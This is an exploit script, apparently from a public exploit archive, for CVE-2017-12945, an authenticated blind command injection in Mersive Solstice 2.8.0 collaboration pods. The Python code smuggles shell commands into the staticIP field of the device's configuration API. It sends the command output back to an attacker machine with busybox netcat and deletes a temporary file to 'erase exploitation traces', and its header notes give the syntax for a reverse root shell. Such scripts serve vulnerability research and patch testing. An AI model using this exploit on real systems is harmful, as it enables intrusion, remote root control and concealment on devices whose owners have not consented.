# Exploit Title: Mersive Solstice 2.8.0 - Remote Code Execution
# Google Dork: N/A
# Date: 2016-12-23
# Exploit Author: Alexandre Teyar
# Vendor Homepage: https://www2.mersive.com/
# Firmware Link: http://www.mersive.com/Support/Releases/SolsticeServer/SGE/Android/2.8.0/Solstice.apk
# Versions: 2.8.0
# Tested On: Mersive Solstice 2.8.0
# CVE: CVE-2017-12945
# Description       : This will exploit an (authenticated) blind OS command injection
#                     vulnerability present in Solstice devices running versions
#                     of the firmware prior to 2.8.4.
# Notes             : To get the the command output (in piped-mode), a netcat listener
#                     (e.g. 'nc -lkvp <LPORT>') needs to be launched before
#                     running the exploit.
#                     To get an interactive root shell use the following syntax
#                     'python.exe .\CVE-2017-12945.py -pass <PASSWORD>
#                     -rh <RHOST> -p "busybox nc <LHOST> <LPORT>
#                     -e /system/bin/sh -i"'.


#!/usr/bin/env python3

import argparse
import logging
import requests
import sys
import time


def parse_args():
    """ Parse and validate the command line supplied by users
    """
    parser = argparse.ArgumentParser(
                description="Solstice Pod Blind Command Injection"
            )

    parser.add_argument(
        "-d",
        "--debug",
        dest="loglevel",
        help="enable verbose debug mode",
        required=False,
        action="store_const",
        const=logging.DEBUG,
        default=logging.INFO
    )
    parser.add_argument(
        "-lh",
        "--lhost",
        dest="lhost",
        help="the listening address",
        required=False,
        type=str
    )
    parser.add_argument(
        "-lp",
        "--lport",
        dest="lport",
        help="the listening port - default 4444",
        required=False,
        default="4444",
        type=str
    )
    parser.add_argument(
        "-p",
        "--payload",
        dest="payload",
        help="the command to execute",
        required=True,
        type=str
    )
    parser.add_argument(
        "-pass",
        "--password",
        dest="password",
        help="the target administrator password",
        required=False,
        default="",
        type=str
    )
    parser.add_argument(
        "-rh",
        "--rhost",
        dest="rhost",
        help="the target address",
        required=True,
        type=str
    )

    return parser.parse_args()


def main():
    try:
        args = parse_args()

        lhost = args.lhost
        lport = args.lport
        password = args.password
        rhost = args.rhost

        logging.basicConfig(
            datefmt="%H:%M:%S",
            format="%(asctime)s: %(levelname)-8s %(message)s",
            handlers=[logging.StreamHandler()],
            level=args.loglevel
        )

        # Redirect stdout and stderr to <FILE>
        # only when the exploit is launched in piped mode
        if lhost and lport:
            payload = args.payload + " > /data/local/tmp/rce.tmp 2>&1"
            logging.info(
                "attacker listening address: {}:{}".format(lhost, lport)
            )
        else:
            payload = args.payload

        logging.info("solstice pod address: {}".format(rhost))

        if password:
            logging.info(
                "solstice pod administrator password: {}".format(password)
            )

        # Send the payload to be executed
        logging.info("sending the payload...")
        send_payload(rhost, password, payload)

        # Send the results of the payload execution to the attacker
        # using 'nc <LHOST> <LPORT> < <FILE>' then remove <FILE>
        if lhost and lport:
            payload = (
                "busybox nc {} {} < /data/local/tmp/rce.tmp ".format(
                    lhost, lport
                )
            )

            logging.info("retrieving the results...")
            send_payload(rhost, password, payload)

            # Erase exploitation traces
            payload = "rm -f /data/local/tmp/rce.tmp"

            logging.info("erasing exploitation traces...")
            send_payload(rhost, password, payload)

    except KeyboardInterrupt:
        logging.warning("'CTRL+C' pressed, exiting...")
        sys.exit(0)


def send_payload(rhost, password, payload):
    URL = "http://{}/Config/service/saveData".format(rhost)

    headers = {
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "http://{}/Config/config.html".format(rhost)
    }

    data = {
        "m_networkCuration":
        {
            "ethernet":
            {
                "dhcp": False,
                "staticIP": "; {}".format(payload),
                "gateway": "",
                "prefixLength": 24,
                "dns1": "",
                "dns2": ""
            }
        },
        "password": "{}".format(password)
    }

    # Debugging using the BurpSuite
    # proxies = {
    #     'http': 'http://127.0.0.1:8080',
    #     'https': 'https://127.0.0.1:8080'
    # }

    try:
        logging.info("{}".format(payload))

        response = requests.post(
            URL,
            headers=headers,
            # proxies=proxies,
            json=data
        )

        logging.debug(
            "{}".format(response.json())
        )

        # Wait for the command to be executed
        time.sleep(2)

    except requests.exceptions.RequestException as ex:
        logging.error("{}".format(ex))
        sys.exit(0)


if __name__ == "__main__":
    main()